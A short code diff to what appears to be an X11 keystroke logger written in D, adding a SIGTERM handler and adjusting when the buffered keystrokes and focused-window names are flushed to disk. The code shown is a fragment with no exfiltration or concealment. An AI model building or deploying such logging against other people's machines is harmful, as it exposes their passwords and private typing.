@@ -38,8 +38,9 @@ string[] keyBuffer;
 int maxKeyBufferLength = 100;
 
 void main() {
-	// Our signal handler
+	// Our signal handlers
 	signal(SIGINT, &handler);
+	signal(SIGTERM, &handler);
 	// Set the error handler to our custom handler
 	XSetErrorHandler(&errorHandler);
 	Display* d = XOpenDisplay(null);
@@ -55,7 +56,7 @@ void main() {
 	currentWindowName = getFocusedWindowName(d, curFocus);
 	while (true) {
 		// Check if we should write our log to disk
-		if (keyBuffer.length > maxKeyBufferLength || doQuit) {
+		if (keyBuffer.length >= maxKeyBufferLength || doQuit) {
 			writeLog();
 		}
 		// Check is we should exit
